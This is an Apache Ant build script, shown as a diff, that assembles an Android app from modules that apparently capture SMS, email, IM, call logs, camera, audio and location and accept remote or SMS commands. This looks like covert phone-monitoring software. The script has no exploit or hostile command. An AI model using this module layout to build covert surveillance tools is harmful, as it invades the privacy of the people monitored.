@@ -1,0 +1,437 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<project name="dependencies">
+
+	<dirname property="dependencies.basedir" file="${ant.file.dependencies}" />
+
+	<property file="environment.properties" />
+	<property file="common.properties" />
+
+	<target name="depend.application.main" depends="depend.shell, depend.process.monitor, depend.process.main, depend.process.bug">
+
+		<echo>depend.application.main # ENTER</echo>
+
+		<echo>depend.application.main # Cleanup</echo>
+		<delete dir="${dependencies.basedir}/source/application-main/assets" />
+		<delete dir="${dependencies.basedir}/source/application-main/build" />
+
+		<echo>depend.application.main # Copy source code</echo>
+
+		<!-- shell -->
+		<copy todir="${dependencies.basedir}/source/application-main/build/src/com/vvt">
+			<fileset dir="${dependencies.basedir}/source/shell/src/com/vvt" />
+		</copy>
+
+		<copy todir="${dependencies.basedir}/source/application-main/libs">
+			<fileset dir="${dependencies.basedir}/source/shell/libs" />
+		</copy>
+
+		<!-- util -->
+		<copy todir="${dependencies.basedir}/source/application-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/util/src" />
+		</copy>
+
+		<!-- daemon manager -->
+		<copy todir="${dependencies.basedir}/source/application-main/build/src">
+            <fileset dir="${dependencies.basedir}/source/daemon_manager/src"/>
+        </copy>
+		<!-- daemon bridge -->
+		<copy todir="${dependencies.basedir}/source/application-main/build/src">
+            <fileset dir="${dependencies.basedir}/source/daemon_bridge/src"/>
+        </copy>
+		<!-- process monitor -->
+		<copy todir="${dependencies.basedir}/source/application-main/build/src/com/fx/pmond/ref">
+            <fileset dir="${dependencies.basedir}/source/process-monitor/src/com/fx/pmond/ref"/>
+        </copy>
+		<!-- process bug -->
+		<copy todir="${dependencies.basedir}/source/application-main/build/src/com/vvt/callmanager/ref">
+            <fileset dir="${dependencies.basedir}/source/process-bug/src/com/vvt/callmanager/ref"/>
+        </copy>
+		<!-- process main -->
+		<copy todir="${dependencies.basedir}/source/application-main/build/src/com/fx/maind/ref">
+            <fileset dir="${dependencies.basedir}/source/process-main/build/src/com/fx/maind/ref"/>
+        </copy>
+		<copy todir="${dependencies.basedir}/source/application-main/libs">
+	    	<fileset dir="${dependencies.basedir}/source/daemon_addressbook_manager/assets"/>
+	    </copy>
+	    
+	    <copy file="${dependencies.basedir}/source/daemon_app_engine/src/com/vvt/daemon/appengine/AppEnginDaemonResource.java"
+	    	tofile= "${dependencies.basedir}/source/application-main/build/src/AppEnginDaemonResource.java"/>
+	    
+	    <copy todir="${dependencies.basedir}/source/application-main/build/src">
+            <fileset dir="${dependencies.basedir}/source/configuration_manager/src"/>
+        </copy>
+	    
+	      <copy todir="${dependencies.basedir}/source/application-main/build/src">
+            <fileset dir="${dependencies.basedir}/source/base/src"/>
+        </copy>
+	    
+
+		<!-- DON'T FORGET TO COPY THE SOURCE CODE OF REFERENCING PROJECT HERE-->
+
+		<echo>depend.application.main # Copy assets</echo>
+		<!-- dex zip file & config.dat file -->
+		<copy file="${dependencies.basedir}/source/process-monitor/${build.dir}/${file.process.monitor}"
+            tofile="${dependencies.basedir}/source/application-main/assets/${file.process.monitor}"/>
+		<copy file="${dependencies.basedir}/source/process-monitor/${build.dir}/${file.config.monitor}"
+            tofile="${dependencies.basedir}/source/application-main/assets/${file.config.monitor}"/>
+		
+		<!-- dex zip file & config.dat file -->
+		<copy file="${dependencies.basedir}/source/process-bug/${build.dir}/${file.process.bug}"
+            tofile="${dependencies.basedir}/source/application-main/assets/${file.process.bug}"/>
+		<copy file="${dependencies.basedir}/source/process-bug/${build.dir}/${file.config.bug}"
+            tofile="${dependencies.basedir}/source/application-main/assets/${file.config.bug}"/>
+		
+		<!-- dex zip file & config.dat file -->
+		<copy file="${dependencies.basedir}/source/process-main/${build.dir}/${file.process.main}"
+            tofile="${dependencies.basedir}/source/application-main/assets/${file.process.main}"/>
+		
+		<!-- product definition file (pdf) -->
+		<copy todir="${dependencies.basedir}/source/application-main/assets">
+        	<fileset dir="${dependencies.basedir}/source/configuration_manager/assets"/>
+        </copy>
+		
+		<!-- libfxexec.so -->
+		<copy todir="${dependencies.basedir}/source/application-main/assets/">
+			<fileset dir="${dependencies.basedir}/source/shell/libs/armeabi" />
+		</copy>
+		
+		<!-- libfxril.so -->
+		<copy todir="${dependencies.basedir}/source/application-main/assets/">
+            <fileset dir="${dependencies.basedir}/source/process-bug/libs/armeabi"/>
+        </copy>
+
+		<echo>depend.application.main # EXIT</echo>
+
+	</target>
+
+	<target name="depend.process.bug" depends="depend.shell">
+		<ant dir="${dependencies.basedir}/source/process-bug" inheritAll="false" target="clean" />
+
+		<!-- libfxril.so -->
+		<if>
+			<equals arg1="${rebuild.ndk.option}" arg2="yes" />
+			<then>
+				<echo>Start rebuilding NDK</echo>
+				<ant dir="${dependencies.basedir}/source/process-bug" inheritAll="false" target="compile.c" />
+			</then>
+			<else>
+				<echo>Skip rebuilding NDK</echo>
+			</else>
+		</if>
+
+		<!-- self -->
+		<copy todir="${dependencies.basedir}/source/process-bug/build/src">
+			<fileset dir="${dependencies.basedir}/source/process-bug/src" />
+		</copy>
+		<!-- shell -->
+		<copy todir="${dependencies.basedir}/source/process-bug/build/src/com/vvt">
+			<fileset dir="${dependencies.basedir}/source/shell/src/com/vvt" />
+		</copy>
+		<copy todir="${dependencies.basedir}/source/process-bug/libs">
+			<fileset dir="${dependencies.basedir}/source/shell/libs" />
+		</copy>
+		<!-- util -->
+		<copy todir="${dependencies.basedir}/source/process-bug/build/src">
+			<fileset dir="${dependencies.basedir}/source/util/src" />
+		</copy>
+		<!-- daemon manager -->
+		<copy todir="${dependencies.basedir}/source/process-bug/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_manager/src" />
+		</copy>
+		<!-- process monitor -->
+        <copy todir="${dependencies.basedir}/source/process-bug/build/src/com/fx/pmond/ref">
+            <fileset dir="${dependencies.basedir}/source/process-monitor/src/com/fx/pmond/ref"/>
+        </copy>
+
+		<!-- DON'T FORGET TO COPY THE SOURCE CODE OF REFERENCING PROJECT HERE-->
+
+		<ant dir="${dependencies.basedir}/source/process-bug" inheritAll="false" target="build" />
+		
+		<copy file="${dependencies.basedir}/source/process-bug/build/${dex.file}"
+            tofile="${dependencies.basedir}/source/process-bug/build/${file.process.bug}"/>
+        	
+		<java jar="${dependencies.basedir}/source/process-bug/${libs.dir}/fxsecurity.jar" fork="true" spawn="true">
+			<arg value="config"/>
+			<arg value="${dependencies.basedir}\source\process-bug\build\${file.config.bug}"/>
+			<arg value="${dependencies.basedir}\source\process-bug\build\FxConfigReader.java"/>
+			<arg value="${dependencies.basedir}\source\process-bug\build\${file.process.bug}"/>
+		</java>
+	</target>
+
+	<target name="depend.process.monitor" depends="depend.shell">
+		<ant dir="${dependencies.basedir}/source/process-monitor" inheritAll="false" target="clean" />
+
+		<!-- self -->
+		<copy todir="${dependencies.basedir}/source/process-monitor/build/src">
+			<fileset dir="${dependencies.basedir}/source/process-monitor/src" />
+		</copy>
+		<!-- shell -->
+		<copy todir="${dependencies.basedir}/source/process-monitor/build/src/com/vvt">
+			<fileset dir="${dependencies.basedir}/source/shell/src/com/vvt" />
+		</copy>
+		<copy todir="${dependencies.basedir}/source/process-monitor/libs">
+			<fileset dir="${dependencies.basedir}/source/shell/libs" />
+		</copy>
+		<!-- util -->
+		<copy todir="${dependencies.basedir}/source/process-monitor/build/src">
+			<fileset dir="${dependencies.basedir}/source/util/src" />
+		</copy>
+		<!-- daemon manager -->
+		<copy todir="${dependencies.basedir}/source/process-monitor/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_manager/src" />
+		</copy>
+
+		<!-- DON'T FORGET TO COPY THE SOURCE CODE OF REFERENCING PROJECT HERE-->
+
+		<ant dir="${dependencies.basedir}/source/process-monitor" inheritAll="false" target="build" />
+		<copy file="${dependencies.basedir}/source/process-monitor/build/${dex.file}"
+            tofile="${dependencies.basedir}/source/process-monitor/build/${file.process.monitor}"/>
+        	
+		<java jar="${dependencies.basedir}/source/process-monitor/${libs.dir}/fxsecurity.jar" fork="true" spawn="true">
+			<arg value="config"/>
+			<arg value="${dependencies.basedir}\source\process-monitor\build\${file.config.monitor}"/>
+			<arg value="${dependencies.basedir}\source\process-monitor\build\FxConfigReader.java"/>
+			<arg value="${dependencies.basedir}\source\process-monitor\build\${file.process.monitor}"/>
+		</java>
+	</target>
+
+	<target name="depend.process.main" depends="depend.shell">
+		<ant dir="${dependencies.basedir}/source/process-main" inheritAll="false" target="clean" />
+
+		<copy todir="${dependencies.basedir}/source/process-main/libs">
+			<fileset dir="${dependencies.basedir}/source/daemon_addressbook_manager/assets" />
+		</copy>
+
+		<!-- self -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/process-main/src" />
+		</copy>
+		<!-- shell -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src/com/vvt">
+			<fileset dir="${dependencies.basedir}/source/shell/src/com/vvt" />
+		</copy>
+		<copy todir="${dependencies.basedir}/source/process-main/libs">
+			<fileset dir="${dependencies.basedir}/source/shell/libs" />
+		</copy>
+		<!-- util -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/util/src" />
+		</copy>
+		
+		<!-- daemon util -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_util/src" />
+		</copy>
+
+		<!-- daemon manager -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_manager/src" />
+		</copy>
+		
+		<!-- daemon bridge -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+            <fileset dir="${dependencies.basedir}/source/daemon_bridge/src"/>
+        </copy>
+		<!-- process monitor -->
+        <copy todir="${dependencies.basedir}/source/process-main/build/src/com/fx/pmond/ref">
+            <fileset dir="${dependencies.basedir}/source/process-monitor/src/com/fx/pmond/ref"/>
+        </copy>
+		<!-- process bug -->
+        <copy todir="${dependencies.basedir}/source/process-main/build/src/com/vvt/callmanager/ref">
+            <fileset dir="${dependencies.basedir}/source/process-bug/src/com/vvt/callmanager/ref"/>
+        </copy>
+
+		<!-- events -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/events/src" />
+		</copy>
+
+		<!-- server_address_manager -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/server_address_manager/src" />
+		</copy>
+
+		<!-- phoenix -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/phoenix/src" />
+		</copy>
+
+		<!-- license_management -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/license_management/src" />
+		</copy>
+
+		<!-- event_repository -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/event_repository/src" />
+		</copy>
+
+		<!-- data_delivery_manager -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/data_delivery_manager/src" />
+		</copy>
+
+		<!-- connection_history_manager -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/connection_history_manager/src" />
+		</copy>
+
+		<!-- configuration_manager -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/configuration_manager/src" />
+		</copy>
+
+		<!-- app_context -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/app_context/src" />
+		</copy>
+
+		<!-- event_centre -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/event_centre/src" />
+		</copy>
+
+		<!-- event_delivery -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/event_delivery/src" />
+		</copy>
+
+		<!-- daemon_addressbook_manager -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_addressbook_manager/src" />
+		</copy>
+		<copy todir="${dependencies.basedir}/source/process-main/libs">
+        	<fileset dir="${dependencies.basedir}/source/daemon_addressbook_manager/assets"/>
+        </copy>
+
+		<!-- base -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/base/src" />
+		</copy>
+
+		<!-- daemon_calllog_capture -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_calllog_capture/src" />
+		</copy>
+
+		<!-- daemon_email_capture -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_email_capture/src" />
+		</copy>
+
+		<!-- daemon_im_capture -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_im_capture/src" />
+		</copy>
+
+		<!-- daemon_mms_capture -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_mms_capture/src" />
+		</copy>
+		
+		<!-- daemon_mms_capture -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_wallpaper_capture/src" />
+		</copy>
+
+		<!-- daemon_sms_capture -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_sms_capture/src" />
+		</copy>
+
+		<!-- activation_manager -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/activation_manager/src" />
+		</copy>
+
+		<!-- daemon_camera_image_capture -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_camera_image_capture/src" />
+		</copy>
+
+		<!-- daemon_video_capture -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_video_capture/src" />
+		</copy>
+
+		<!-- daemon_audio_capture -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_audio_capture/src" />
+		</copy>
+
+		<!-- preference_manager -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/preference_manager/src" />
+		</copy>
+
+		<!-- daemon_remote_command_manager -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_remote_command_manager/src" />
+		</copy>
+
+		<!-- location_capture -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/location_capture/src" />
+		</copy>
+
+		<!-- sms_command_receiver -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/sms_command_receiver/src" />
+		</copy>
+
+		<!-- sim_change_capture -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/sim_change_capture/src" />
+		</copy>
+
+		<!-- daemon_app_engine -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_app_engine/src" />
+		</copy>
+		
+		<!-- daemon_app_engine -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_util/src" />
+		</copy>
+
+		<!-- http -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/http/src" />
+		</copy>
+		
+		<!-- daemon_wallpaper_capture -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_wallpaper_capture/src" />
+		</copy>
+		
+		<!-- daemon_media_history_capture -->
+		<copy todir="${dependencies.basedir}/source/process-main/build/src">
+			<fileset dir="${dependencies.basedir}/source/daemon_media_history_capture/src" />
+		</copy>
+		
+		
+		
+		<!-- DON'T FORGET TO COPY THE SOURCE CODE OF REFERENCING PROJECT HERE-->
+
+		
+		<ant dir="${dependencies.basedir}/source/process-main" inheritAll="false" target="build" />
+		
+		<copy file="${dependencies.basedir}/source/process-main/build/${dex.file}"
+		     tofile="${dependencies.basedir}/source/process-main/build/${file.process.main}"/>
+		
+	</target>
+
+	<target name="depend.shell">
+		<if>
+			<equals arg1="${rebuild.ndk.option}" arg2="yes" />
+			<then>
+				<echo>Start rebuilding NDK</echo>
+				<ant dir="${dependencies.basedir}/source/shell" inheritAll="false" target="compile.c" />
+			</then>
+			<else>
+				<echo>Skip rebuilding NDK</echo>
+			</else>
+		</if>
+	</target>
+
+</project>
